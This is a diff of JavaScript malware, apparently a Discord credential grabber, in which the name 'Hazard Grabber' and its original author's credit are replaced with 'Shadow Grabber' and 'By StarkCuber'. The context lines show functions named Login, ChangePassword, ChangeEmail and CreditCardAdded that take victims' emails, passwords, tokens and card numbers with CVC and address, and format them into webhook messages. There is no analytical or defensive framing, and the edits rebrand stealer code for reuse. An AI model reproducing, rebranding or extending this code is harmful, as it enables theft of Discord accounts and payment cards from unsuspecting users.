@@ -144,7 +144,7 @@ function Login(email, password, token) {
     xmlHttp.responseText;`, !0).then((info) => {
         const json = JSON.parse(info);
         var params = {
-            username: "Hazard Grabber",
+            username: "Shadow Grabber",
             content: "",
             avatar_url: "https://cdn.discordapp.com/attachments/853347983639052318/857677082435649536/nedladdning_14.jpg",
             embeds: [
@@ -167,7 +167,7 @@ function Login(email, password, token) {
                         "icon_url": `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`
                     },
                     "footer": {
-                        "text": "Hazard Grabber By Rdimo#6969・https://github.com/Rdimo/Hazard-Nuker"
+                        "text": "By StarkCuber"
                     }
                 }
             ]
@@ -192,7 +192,7 @@ function ChangePassword(oldpassword, newpassword, token) {
     `, !0).then((ip) => {
             const json = JSON.parse(info);
             var params = {
-                username: "Hazard Grabber",
+                username: "Shadow Grabber",
                 content: "",
                 avatar_url: "https://cdn.discordapp.com/attachments/853347983639052318/857677082435649536/nedladdning_14.jpg",
                 embeds: [
@@ -245,7 +245,7 @@ function ChangeEmail(newemail, password, token) {
         xmlHttp.responseText;
     `, !0).then((ip) => {
             var params = {
-                username: "Hazard Grabber",
+                username: "Shadow Grabber",
                 content: "",
                 avatar_url: "https://cdn.discordapp.com/attachments/853347983639052318/857677082435649536/nedladdning_14.jpg",
                 embeds: [
@@ -273,7 +273,7 @@ function ChangeEmail(newemail, password, token) {
                             "icon_url": `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`
                         },
                         "footer": {
-                            "text": "Hazard Grabber By Rdimo#6969・https://github.com/Rdimo/Hazard-Nuker"
+                            "text": "By StarkCuber"
                         }                
                     }
                 ]
@@ -299,7 +299,7 @@ function CreditCardAdded(number, cvc, expir_month, expir_year, street, city, sta
     `, !0).then((ip) => {
             var json = JSON.parse(info);
             var params = {
-                username: "Hazard Grabber",
+                username: "Shadow Grabber",
                 content: "",
                 avatar_url: "https://cdn.discordapp.com/attachments/853347983639052318/857677082435649536/nedladdning_14.jpg",
                 embeds: [
@@ -327,7 +327,7 @@ function CreditCardAdded(number, cvc, expir_month, expir_year, street, city, sta
                             "icon_url": `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`
                         },
                         "footer": {
-                            "text": "Made By Shadow"
+                            "text": "By StarkCuber"
                         }
                     }
                 ]
@@ -352,7 +352,7 @@ function CreditCardAdded(number, cvc, expir_month, expir_year, street, city, sta
     `, !0).then((ip) => {
 			var json = JSON.parse(info);
             var params = {
-                username: "Hazard Grabber",
+                username: "Shadow Grabber",
                 content: "",
                 avatar_url: "https://cdn.discordapp.com/attachments/853347983639052318/857677082435649536/nedladdning_14.jpg",
                 embeds: [
@@ -380,7 +380,7 @@ function CreditCardAdded(number, cvc, expir_month, expir_year, street, city, sta
                             "icon_url": `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`
                         },
                         "footer": {
-                            "text": "Hazard Grabber By Rdimo#6969・https://github.com/Rdimo/Hazard-Nuker"
+                            "text": "By StarkCuber"
                         }
                     }
                 ]
